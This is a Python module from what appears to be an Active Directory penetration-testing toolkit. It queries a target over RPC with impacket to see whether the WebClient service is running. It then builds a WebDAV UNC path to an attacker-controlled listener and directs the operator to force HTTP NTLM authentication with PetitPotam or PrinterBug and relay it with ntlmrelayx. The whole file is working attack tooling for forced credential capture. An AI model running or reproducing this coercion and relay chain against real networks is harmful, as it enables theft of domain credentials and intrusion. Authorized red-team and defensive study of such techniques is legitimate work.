"""WebClient coercion — trigger WebDAV auth to capture NTLM over HTTP."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.coercion.webclient_coerce.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "webdav_trigger"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def _check_webclient_running(target: str, cred: ADCredential) -> bool:
    """Check if WebClient service is running via SCM query."""
    try:
        from impacket.dcerpc.v5 import transport, scmr
        string_binding = f"ncacn_np:{target}[\\pipe\\svcctl]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        if cred.username:
            rpc_transport.set_credentials(
                cred.username, cred.password or "", cred.domain,
                cred.lm_hash, cred.nt_hash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        resp = scmr.hROpenSCManagerW(dce)
        sc_handle = resp["lpScHandle"]
        resp = scmr.hROpenServiceW(dce, sc_handle, "WebClient")
        svc_handle = resp["lpServiceHandle"]
        resp = scmr.hRQueryServiceStatus(dce, svc_handle)
        state = resp["lpServiceStatus"]["dwCurrentState"]
        dce.disconnect()
        return state == scmr.SERVICE_RUNNING
    except Exception:
        return False


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    listener = getattr(args, "listener", None)
    check_only = getattr(args, "check_only", False)

    if check_only:
        running = _check_webclient_running(target, cred)
        print("[{}] WebClient service on {}: {}".format(
            "+" if running else "-", target,
            "RUNNING" if running else "NOT RUNNING"))
        return 0 if running else 1

    if not listener:
        print("[!] --listener required", file=sys.stderr)
        return 1

    print(f"[*] WebClient coercion: {target} → {listener} (HTTP-based NTLM)")

    running = _check_webclient_running(target, cred)
    if not running:
        print("[!] WebClient service not running on target")
        print("[*] Tip: start it via: searchconnector-ws file or Webclient activation trick")

    webdav_url = f"\\\\{listener}@80\\share\\file"
    print(f"[*] Coercion UNC (HTTP): {webdav_url}")
    print("[*] Use PetitPotam/PrinterBug with this UNC to force HTTP auth")
    print(f"[*] ntlmrelayx on {listener} should capture HTTP-based NTLM")
    return 0
